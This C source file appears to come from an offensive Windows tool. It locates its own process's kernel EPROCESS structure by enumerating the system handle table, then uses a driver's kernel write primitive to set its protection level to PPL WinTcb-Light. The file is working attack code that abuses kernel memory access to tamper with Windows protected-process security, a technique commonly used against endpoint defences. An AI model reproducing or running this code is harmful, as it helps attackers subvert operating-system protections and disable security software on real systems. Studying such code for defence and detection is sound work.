/*

--- Functions to set the current process as a Protected Process (PsProtectedSignerWinTcb-Light).
--- The code to locate the EPROCESS structure is adapted from:
    http://blog.rewolf.pl/blog/?p=1683
*/
#include <tchar.h>

#include "KernelMemoryPrimitives.h"
#include "NtoskrnlOffsets.h"
#include "RunAsPPL.h"

DWORD64 GetSelfEPROCESSAddress(BOOL verbose) {
    NTSTATUS status;
    DWORD currentProcessID = GetCurrentProcessId();

    // Open an handle to our own process.
    HANDLE selfProcessHandle = OpenProcess(SYNCHRONIZE, FALSE, currentProcessID);
    if (verbose) {
        _tprintf(TEXT("[*] Self process handle: 0x%hx\n"), (USHORT)((ULONG_PTR)selfProcessHandle));
    }


    // Retrieves the native NtQuerySystemInformation function from ntdll.
    HMODULE hNtdll = GetModuleHandle(TEXT("ntdll"));
    if (!hNtdll) {
        _tprintf(TEXT("[!] ERROR: could not open an handle to ntdll to find the EPROCESS struct of the current process\n"));
        return 0x0;
    }
    _NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    if (!NtQuerySystemInformation) {
        _tprintf(TEXT("[!] ERROR: could not retrieve NtQuerySystemInformation function to find the EPROCESS struct of the current process\n"));
        return 0x0;
    }

    /*
    * Retrieves all the handle table using NtQuerySystemInformation.
    * Looping until NtQuerySystemInformation has sufficient space to do so (i.e does not return a STATUS_INFO_LENGTH_MISMATCH).
    * Possible alternative to explore woule be to use the ReturnLength returned by NtQuerySystemInformation.
    */
    ULONG SystemHandleInformationSize = SystemHandleInformationBaseSize;
    PSYSTEM_HANDLE_INFORMATION tmpHandleTableInformation = NULL;
    PSYSTEM_HANDLE_INFORMATION pHandleTableInformation = (PSYSTEM_HANDLE_INFORMATION)malloc(SystemHandleInformationSize);
    if (!pHandleTableInformation) {
        _tprintf(TEXT("[!] ERROR: could not allocate memory for the handle table to find the EPROCESS struct of the current process\n"));
        return 0x0;
    }
    status = NtQuerySystemInformation(SystemHandleInformation, pHandleTableInformation, SystemHandleInformationSize, NULL);
    while (status == STATUS_INFO_LENGTH_MISMATCH) {
        SystemHandleInformationSize = SystemHandleInformationSize * 2;
        tmpHandleTableInformation = (PSYSTEM_HANDLE_INFORMATION)realloc(pHandleTableInformation, SystemHandleInformationSize);
        if (!tmpHandleTableInformation) {
            _tprintf(TEXT("[!] ERROR: could not realloc memory for the handle table to find the EPROCESS struct of the current process\n"));
            return 0x0;
        }
        pHandleTableInformation = tmpHandleTableInformation;
        status = NtQuerySystemInformation(SystemHandleInformation, pHandleTableInformation, SystemHandleInformationSize, NULL);
    }
    if (!NT_SUCCESS(status)) {
        _tprintf(TEXT("[!] ERROR: could not retrieve the HandleTableInformation to find the EPROCESS struct of the current process\n"));
        return 0x0;
    }

    // Iterates through all the handles.
    DWORD64 returnAddress = 0x0;
    for (DWORD i = 0; i < pHandleTableInformation->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = pHandleTableInformation->Handles[i];

        // Only retrieves the handles associated with our own process.
        if (handleInfo.UniqueProcessId != currentProcessID) {
            continue;
        }

        if (verbose) {
            _tprintf(TEXT("[*] Handle for the current process (PID: %hd): 0x%hx at 0x%I64x\n"), handleInfo.UniqueProcessId, handleInfo.HandleValue, (DWORD64)handleInfo.Object);
        }

        if (handleInfo.HandleValue == (USHORT)((ULONG_PTR)selfProcessHandle)) {
            _tprintf(TEXT("[+] Found the handle of the current process (PID: %hd): 0x%hx at 0x%I64x\n"), handleInfo.UniqueProcessId, handleInfo.HandleValue, (DWORD64)handleInfo.Object);
            returnAddress = (DWORD64)handleInfo.Object;
        }
    }
    free(pHandleTableInformation);
    CloseHandle(selfProcessHandle);
    return returnAddress;
}

int SetCurrentProcessAsProtected(BOOL verbose) {
    HANDLE Device = GetDriverHandle();
    DWORD64 processEPROCESSAddress = GetSelfEPROCESSAddress(verbose);
    if (processEPROCESSAddress == 0x0) {
        _tprintf(TEXT("[!] ERROR: could not find the EPROCCES struct of the current process to self protect\n"));
        CloseHandle(Device);
        return -1;
    }
    _tprintf(TEXT("[+] Found self process EPROCCES struct at 0x%I64x\n"), processEPROCESSAddress);

    // Sets the current process EPROCESS's ProtectionLevel as Light WinTcb (PS_PROTECTED_WINTCB_LIGHT, currently 0x61).
    DWORD64 processSignatureLevelAddress = processEPROCESSAddress + ntoskrnlOffsets.st.ps_protection;
    // DWORD64 processSignatureLevelAddress = 0xffffe481d073a080 + offsets.st.ps_protection;

    UCHAR flagPPLWinTcb = ((UCHAR)((PsProtectedSignerWinTcb) << 4)) | ((UCHAR)(PsProtectedTypeProtectedLight));
    _tprintf(TEXT("[*] Protecting own process by setting the EPROCESS's ProtectionLevel (at 0x%I64x) to 0x%hx (PS_PROTECTED_WINTCB_LIGHT)\n"), processSignatureLevelAddress, flagPPLWinTcb);
    WriteMemoryWORD(Device, processSignatureLevelAddress, flagPPLWinTcb);

    CloseHandle(Device);

    return 0;
}